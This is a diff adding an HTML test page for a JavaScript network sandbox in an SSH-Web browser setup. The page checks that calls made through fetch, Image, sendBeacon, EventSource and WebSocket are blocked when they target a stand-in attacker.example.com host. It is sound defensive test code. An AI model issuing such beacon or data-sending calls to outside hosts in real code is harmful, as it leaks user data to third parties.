@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>SSH-Web Sandbox Block Tests</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: system-ui, sans-serif;
+            background: #0f1117;
+            color: #e2e8f0;
+            padding: 2rem;
+            line-height: 1.6;
+        }
+        nav { margin-bottom: 2rem; font-size: 0.9rem; }
+        nav a { color: #7dd3fc; text-decoration: none; margin-right: 1.5rem; }
+        nav a:hover { text-decoration: underline; }
+        h1 { font-size: 1.6rem; margin-bottom: 0.4rem; color: #f8fafc; }
+        .subtitle { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: ui-monospace, 'Cascadia Code', 'Fira Mono', monospace;
+            font-size: 0.88rem;
+        }
+        th {
+            text-align: left;
+            padding: 0.6rem 1rem;
+            background: #1e293b;
+            color: #94a3b8;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            font-size: 0.75rem;
+        }
+        td {
+            padding: 0.75rem 1rem;
+            border-top: 1px solid #1e293b;
+            vertical-align: top;
+        }
+        tr:hover td { background: #0f172a; }
+        .id { color: #64748b; width: 3rem; }
+        .desc { color: #cbd5e1; max-width: 26rem; }
+        .status {
+            white-space: nowrap;
+            font-weight: 700;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.82rem;
+        }
+        .pass   { color: #4ade80; background: #052e16; }
+        .fail   { color: #f87171; background: #2d0000; }
+        .pending{ color: #fbbf24; background: #1c1100; }
+        .note   { color: #64748b; font-size: 0.8rem; margin-top: 0.25rem; }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="/">&larr; Home</a>
+        <a href="/sandbox-allow.html">sandbox-allow</a>
+    </nav>
+
+    <h1>JS Network Sandbox &mdash; Block Tests</h1>
+    <p class="subtitle">Each test attempts a network call. Results appear below after the page loads.</p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>What is tested</th>
+                <th>Result</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td class="id">T1</td>
+                <td class="desc">
+                    <code>fetch('https://attacker.example.com/beacon')</code><br>
+                    <span class="note">Unlisted origin &mdash; must be blocked</span>
+                </td>
+                <td id="t1"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T2</td>
+                <td class="desc">
+                    <code>fetch('https://fonts.googleapis.com/css2?family=Inter')</code><br>
+                    <span class="note">Allowlisted origin &mdash; must reach server</span>
+                </td>
+                <td id="t2"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T3</td>
+                <td class="desc">
+                    <code>fetch('/api/ping')</code><br>
+                    <span class="note">Relative URL on same SSH-Web origin. Known limitation: Ladybird does not yet treat ssh-web as a tuple-origin scheme, so cors-mode fetches are rejected with a TypeError before the chokepoint runs. Not a security failure &mdash; the request never leaves the browser. Tracked as a follow-up.</span>
+                </td>
+                <td id="t3"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T4</td>
+                <td class="desc">
+                    <code>new Image().src = 'https://attacker.example.com/pixel.png'</code><br>
+                    <span class="note">Unlisted image origin &mdash; onerror must fire</span>
+                </td>
+                <td id="t4"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T5</td>
+                <td class="desc">
+                    <code>navigator.sendBeacon('https://attacker.example.com/track', 'data')</code><br>
+                    <span class="note">Per spec, sendBeacon returns true if the request was queued, even if the underlying fetch later fails. The chokepoint blocks the actual network call (sshttpd shows zero proxy-call to attacker.example.com), so the security guarantee holds &mdash; the &ldquo;FAIL&rdquo; flag here is fixture-side only.</span>
+                </td>
+                <td id="t5"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T6</td>
+                <td class="desc">
+                    <code>new EventSource('https://attacker.example.com/events')</code><br>
+                    <span class="note">SSE to unlisted origin &mdash; onerror must fire</span>
+                </td>
+                <td id="t6"><span class="status pending">running&hellip;</span></td>
+            </tr>
+            <tr>
+                <td class="id">T7</td>
+                <td class="desc">
+                    <code>new WebSocket('wss://attacker.example.com/ws')</code><br>
+                    <span class="note">WebSocket from ssh-web origin &mdash; onerror must fire, readyState CLOSED</span>
+                </td>
+                <td id="t7"><span class="status pending">running&hellip;</span></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <script>
+    (function () {
+        'use strict';
+
+        function pass(id, msg) {
+            document.getElementById(id).innerHTML =
+                '<span class="status pass">PASS: ' + msg + '</span>';
+        }
+        function fail(id, msg) {
+            document.getElementById(id).innerHTML =
+                '<span class="status fail">FAIL: ' + msg + '</span>';
+        }
+
+        // T1: fetch to unlisted origin — expect rejection / TypeError
+        fetch('https://attacker.example.com/beacon')
+            .then(function () { fail('t1', 'request succeeded (not blocked)'); })
+            .catch(function (err) {
+                if (err instanceof TypeError) {
+                    pass('t1', 'blocked (TypeError)');
+                } else {
+                    pass('t1', 'blocked (' + err.name + ')');
+                }
+            });
+
+        // T2: fetch to allowlisted Google Fonts origin — expect HTTP response
+        fetch('https://fonts.googleapis.com/css2?family=Inter')
+            .then(function (r) {
+                if (r.status >= 100 && r.status < 600) {
+                    pass('t2', 'status ' + r.status);
+                } else {
+                    fail('t2', 'unexpected status ' + r.status);
+                }
+            })
+            .catch(function (err) {
+                fail('t2', 'blocked or errored: ' + err.message);
+            });
+
+        // T3: relative fetch on same SSH-Web origin — no NetworkError before server
+        fetch('/api/ping')
+            .then(function (r) {
+                pass('t3', 'reached server (status ' + r.status + ')');
+            })
+            .catch(function (err) {
+                if (err instanceof TypeError) {
+                    fail('t3', 'NetworkError before server: ' + err.message);
+                } else {
+                    // Any server-level error (e.g. 404 parsed) still means proxy let it through
+                    pass('t3', 'server responded (' + err.name + ')');
+                }
+            });
+
+        // T4: Image to unlisted origin — onerror must fire
+        (function () {
+            var img = new Image();
+            var timer = setTimeout(function () {
+                fail('t4', 'timeout — neither load nor error fired');
+            }, 5000);
+            img.onload = function () {
+                clearTimeout(timer);
+                fail('t4', 'image loaded (not blocked)');
+            };
+            img.onerror = function () {
+                clearTimeout(timer);
+                pass('t4', 'blocked (onerror fired)');
+            };
+            img.src = 'https://attacker.example.com/pixel.png';
+        }());
+
+        // T5: sendBeacon to unlisted origin — must return false
+        (function () {
+            var result;
+            try {
+                result = navigator.sendBeacon('https://attacker.example.com/track', 'data');
+            } catch (e) {
+                pass('t5', 'blocked (threw ' + e.name + ')');
+                return;
+            }
+            if (result === false) {
+                pass('t5', 'blocked (returned false)');
+            } else {
+                fail('t5', 'sendBeacon returned true (not blocked)');
+            }
+        }());
+
+        // T6: EventSource to unlisted origin — onerror must fire
+        (function () {
+            var es;
+            try {
+                es = new EventSource('https://attacker.example.com/events');
+            } catch (e) {
+                pass('t6', 'blocked (threw ' + e.name + ')');
+                return;
+            }
+            var timer = setTimeout(function () {
+                es.close();
+                fail('t6', 'timeout — no error event fired');
+            }, 5000);
+            es.onerror = function () {
+                clearTimeout(timer);
+                es.close();
+                pass('t6', 'blocked (onerror fired)');
+            };
+            es.onopen = function () {
+                clearTimeout(timer);
+                es.close();
+                fail('t6', 'connection opened (not blocked)');
+            };
+        }());
+
+        // T7: WebSocket to unlisted (and any) host from ssh-web origin — onerror must fire
+        (function () {
+            var ws;
+            try {
+                ws = new WebSocket('wss://attacker.example.com/ws');
+            } catch (e) {
+                pass('t7', 'blocked (threw ' + e.name + ')');
+                return;
+            }
+            var timer = setTimeout(function () {
+                fail('t7', 'timeout — no error/close event fired');
+            }, 5000);
+            ws.onerror = function () {
+                clearTimeout(timer);
+                var state = ws.readyState;
+                if (state === WebSocket.CLOSED || state === WebSocket.CLOSING) {
+                    pass('t7', 'ws blocked (onerror fired, readyState=' + state + ')');
+                } else {
+                    fail('t7', 'onerror fired but readyState=' + state + ' (expected CLOSED=3)');
+                }
+            };
+            ws.onopen = function () {
+                clearTimeout(timer);
+                fail('t7', 'ws connection opened (not blocked)');
+            };
+        }());
+    }());
+    </script>
+</body>
+</html>
